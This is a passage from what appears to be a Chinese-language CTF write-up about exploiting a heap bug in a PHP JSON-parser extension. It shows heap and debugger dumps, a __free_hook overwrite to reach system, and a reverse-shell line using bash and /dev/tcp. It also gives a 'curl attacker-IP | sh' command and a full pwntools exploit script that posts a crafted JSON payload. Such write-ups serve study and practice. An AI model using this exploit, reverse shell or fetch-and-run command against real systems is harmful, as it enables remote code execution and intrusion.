PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x405fa0</span> <span class="comment">/* data */</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x405fc0</span> <span class="comment">/* info struct */</span></span><br><span class="line">Size: <span class="number">0x51</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x406010</span> <span class="comment">/* name */</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x406030</span> <span class="comment">/* data */</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x405fc0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x405fc0</span> ◂— <span class="number">0x0</span> <span class="comment">/* info struct */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x405fc8</span> ◂— <span class="number">0x51</span> <span class="comment">/* &#x27;Q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x405fd0</span> —▸ <span class="number">0x405fb0</span> ◂— <span class="number">0x61616161616161</span> <span class="comment">/* &#x27;aaaaaaa&#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x405fd8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x405fe0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x405fe8</span> ◂— <span class="number">0x4</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x405ff0</span> —▸ <span class="number">0x405f90</span> ◂— <span class="number">0x31</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x405ff8</span> ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; </span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x406000</span> —▸ <span class="number">0x406060</span> —▸ <span class="number">0x406040</span> ◂— <span class="number">0x61616161616161</span> <span class="comment">/* &#x27;aaaaaaa&#x27; */</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x406008</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x406010</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x406018</span> ◂— <span class="number">0x21</span> <span class="comment">/* name */</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x406020</span> ◂— <span class="number">0x32</span> <span class="comment">/* &#x27;2&#x27; */</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x406028</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x406030</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x406038</span> ◂— <span class="number">0x21</span> <span class="comment">/* data */</span></span><br><span class="line">pwndbg&gt; </span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x406040</span> ◂— <span class="number">0x61616161616161</span> <span class="comment">/* &#x27;aaaaaaa&#x27; */</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│  <span class="number">0x406048</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│  <span class="number">0x406050</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>每一组数据（一个 object）申请 3 个 chunk，分别存放：<code>info struct</code>，<code>name</code>，<code>data</code></li>
</ul>
<p>源码中还有一个有趣的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">delete_item</span><span class="params">(__int64 info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)(info + <span class="number">56</span>) )</span><br><span class="line">    *(_QWORD *)(*(_QWORD *)(info + <span class="number">56</span>) + <span class="number">48LL</span>) = *(_QWORD *)(info + <span class="number">48</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)(info + <span class="number">24</span>) == <span class="number">4LL</span> )</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="keyword">void</span> **)info);</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)(info + <span class="number">32</span>) )</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(info + <span class="number">32</span>));</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这个函数拥有一次覆盖的机会，如果可以控制 <code>info struct+56</code> 和 <code>info struct+48</code>，就可以实现一次 WAA</li>
<li>现在就要构建堆风水，把 <code>data</code> 弄到 <code>info struct</code> 上面，进行溢出</li>
</ul>
<p>回看 <code>parser_string</code> 的逻辑，如果数据不以 “ “ ” 开头，就调用 malloc(1)，接着就会被释放，利用这个性质就可以把 <code>data</code> 申请到 <code>info struct</code> 上面</p>
<p>接下来我们尝试覆盖 free_hook 为 system：</p>
<ul>
<li>原始的 <code>info struct</code> </li>
</ul>
<p><img src="/2022/07/06/PHP%20pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+so%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E8%AF%95/1657080162891.png" alt="1657080162891"> </p>
<ul>
<li>修改后的 <code>info struct</code> </li>
</ul>
<p><img src="/2022/07/06/PHP%20pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+so%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E8%AF%95/1657080977533.png" alt="1657080977533">  </p>
<ul>
<li>执行 delete_item 准备替换：</li>
</ul>
<p><img src="/2022/07/06/PHP%20pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+so%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E8%AF%95/1657080322187.png" alt="1657080322187"> </p>
<ul>
<li>执行替换操作前：</li>
</ul>
<p><img src="/2022/07/06/PHP%20pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+so%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E8%AF%95/1657080359790.png" alt="1657080359790">  </p>
<ul>
<li>[rdx] 中就是 system</li>
<li>[rax + 0x30] 中就是 __free_hook</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff7fa8e18</span>+<span class="number">0x30</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff7fa8e48</span> (__free_hook) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>替换后：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff7fa8e18</span>+<span class="number">0x30</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff7fa8e48</span> (__free_hook) —▸ <span class="number">0x7ffff7e0c290</span> (system) ◂— endbr64 </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffff7fa8e50</span> (__malloc_initialize_hook) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>执行 free 前：</li>
</ul>
<p><img src="/2022/07/06/PHP%20pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+so%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E8%AF%95/1657081052951.png" alt="1657081052951"> </p>
<ul>
<li>结果</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ni</span><br><span class="line">[Attaching after process <span class="number">14488</span> vfork to child process <span class="number">14493</span>]</span><br><span class="line">[New inferior <span class="number">2</span> (process <span class="number">14493</span>)]</span><br><span class="line">[Detaching vfork parent process <span class="number">14488</span> after child exec]</span><br><span class="line">[Inferior <span class="number">1</span> (process <span class="number">14488</span>) detached]</span><br><span class="line">process <span class="number">14493</span> is executing <span class="keyword">new</span> program: /usr/bin/dash</span><br><span class="line">Warning:</span><br><span class="line">Cannot insert breakpoint <span class="number">2.</span></span><br><span class="line">Cannot access memory at address <span class="number">0x7ffff7fc5478</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/07/06/PHP%20pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+so%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E8%AF%95/1657082871982.png" alt="1657082871982">  </p>
<ul>
<li>可以发现 PID-14493 的进程就是 /bin/sh</li>
</ul>
<p>关于远程则需要使用反弹 shell，让受害端执行以下代码就可以了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>IP 和 PORT 是攻击端的 IP / 端口</li>
</ul>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/iouwenbo/p/11277453.html#:~:text=反弹shell（reverse,shell），就是控制端监听在某TCP%2FUDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。">反弹shell原理与实现</a> </p>
<p>可以先采用 <code>system(&quot; bash -c &#39;curl xx.xx.xx.xx|sh&#39; &quot;)</code> 让受害端连接攻击端，然后再执行上述代码</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#host = &#x27;http://127.0.0.1:7777/&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;http://192.168.249.228:7777/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">package</span>(<span class="params">number</span>):</span></span><br><span class="line">    num = <span class="string">&quot;&#123;:0&gt;16x&#125;&quot;</span>.<span class="built_in">format</span>(number)</span><br><span class="line">    tmp = [num[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">2</span>)][::-<span class="number">1</span>]</span><br><span class="line">    tmp2 = [<span class="string">&quot;&quot;</span>.join(tmp[i:i+<span class="number">2</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>, <span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;\\u&quot;</span> + <span class="string">&quot;\\u&quot;</span>.join(tmp2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printff</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;:0&gt;16x&#125;&quot;</span>.<span class="built_in">format</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name = <span class="string">&#x27;&#x27;</span>, value = <span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    <span class="keyword">global</span> json</span><br><span class="line">    json += <span class="string">&#x27;&quot;&#123;&#125;&quot;:&quot;&#123;&#125;&quot;,&#x27;</span>.<span class="built_in">format</span>(name, value)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">base = <span class="number">0x7ffff7dba000</span></span><br><span class="line"><span class="comment">#base = 0x7f74de914000</span></span><br><span class="line"></span><br><span class="line">system = base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">execve = base + libc.sym[<span class="string">&quot;execve&quot;</span>]</span><br><span class="line">printf = base + libc.sym[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">free_hook = base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">free_got = base + libc.got[<span class="string">&quot;free&quot;</span>]</span><br><span class="line">binsh = base + <span class="number">0x00000000001b45bd</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">success(<span class="string">&quot;execve &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(execve))</span><br><span class="line">success(<span class="string">&quot;printf &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(printf))</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&quot;binsh &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">json = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&#123;pad1&#125;\\\x00&#123;pad2&#125;&#123;fake_item&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">    pad1 = <span class="string">&#x27;c&#x27;</span> * <span class="number">0x1e</span>, </span><br><span class="line">    pad2 = <span class="string">&#x27;a&#x27;</span>* (<span class="number">0x40</span> - <span class="number">0x2e</span>), </span><br><span class="line">    <span class="comment">#fake_item = &quot;bash -c &#x27;curl xxx.xxx.xxx.xxx|sh&#x27;&quot; + package(binsh) + package(0) + package(system) + package(free_hook - 0x30)</span></span><br><span class="line">    fake_item = <span class="string">&quot;/bin/sh&quot;</span> + <span class="string">&quot;\\u0000a&quot;</span>*<span class="number">3</span> + <span class="string">&quot;a&quot;</span> *<span class="number">0x10</span> + package(binsh) + package(<span class="number">0</span>) + package(system) + package(free_hook - <span class="number">0x30</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;1&quot;</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="string">&quot;2&quot;</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="string">&quot;3&quot;</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="string">&quot;3&quot;</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="string">&quot;A&quot;</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="string">&quot;A&quot;</span>, <span class="number">1</span>)</span><br><span class="line">add(<span class="string">&quot;B&quot;</span>, <span class="number">2</span>)</span><br><span class="line">add(<span class="string">&quot;/bin/sh&quot;</span>, payload)</span><br><span class="line">json = <span class="string">&#x27;&#123;&#x27;</span> + json + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">r = requests.post(host, data=&#123;<span class="string">&#x27;wishes&#x27;</span>: json&#125;)</span><br><span class="line"><span class="built_in">print</span>(json)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;exp.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(json)</span><br></pre></td></tr></table></figure>
<ul>
<li>执行后会把 json 写到 exp.json 中</li>
</ul>
<p>调试用的 loader：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc loader.c -o loader -ldl -g</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">reader</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">int</span> offset;</span><br><span class="line">&#125; _reader;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *handle = dlopen(<span class="string">&quot;file2ctfer/fpm/jsonparser.so&quot;</span>, RTLD_LAZY);</span><br><span class="line">    <span class="keyword">void</span> *(* Parser)(<span class="keyword">void</span> *temp);</span><br><span class="line">    _reader *reader = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">char</span> * json = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;./exp.json&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> size = read(fd, json, <span class="number">0x200</span>);</span><br><span class="line">    reader-&gt;buf = json;</span><br><span class="line">    reader-&gt;size = size;</span><br><span class="line">    reader-&gt;offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    Parser = dlsym(handle, <span class="string">&quot;Parser&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,Parser);</span><br><span class="line">    Parser(reader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>这几天复现这个题目很痛苦，环境都搭了好长时间，但是也收获颇丰：</p>
<ul>
<li>PHP pwn 入门</li>
<li>PHP 扩展的搭建</li>
<li>so 文件的调试</li>
<li>docker 的使用</li>
<li>一些调试的技巧</li>
</ul>
<p>但最后还是没有打通远程，因为我的 IP 地址多占了几字节，导致 <code>bash -c &#39;curl xxx.xxx.xxx.xxx|sh&#39;</code> 这个字符串超范围了，所以后面的 <code>info struct+56</code> 和 <code>info struct+48</code> 错位，也就打不通了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">156</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">10</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">105</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">2m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">30:58</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
